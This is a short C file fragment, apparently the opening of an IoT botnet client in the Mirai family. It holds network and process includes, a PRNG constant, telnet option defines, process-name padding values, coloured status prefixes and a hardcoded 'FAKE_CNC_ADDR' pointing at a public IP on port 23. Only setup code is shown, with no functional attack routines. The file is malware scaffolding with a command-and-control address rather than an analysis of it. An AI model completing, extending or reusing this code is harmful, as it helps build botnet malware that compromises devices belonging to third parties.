#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>
/////////////////////////
#define OPT_SGA   3
#define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))
#define PHI 0x9e3779b9
#define pr_name 15
#define pad_r 1
#define pad_z 2
#define printbuf_len 12
/////////////////////////
#include "stuff.h"

#define STDIN 0
#define STDOUT 1
#define STDERR 2

typedef char BOOL;

typedef uint32_t ipv4_t;
typedef uint16_t port_t;

#define FALSE 0
#define TRUE 1

#define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))

#define FAKE_CNC_ADDR INET_ADDR(185,163,254,12)
#define FAKE_CNC_PORT 23

ipv4_t LOCAL_ADDR;

#define SUCCESS "[\x1b[32m+\x1b[37m]"
#define FAILED "[\x1b[31m-\x1b[37m]"
#define INFO "[\x1b[33m?\x1b[37m]"
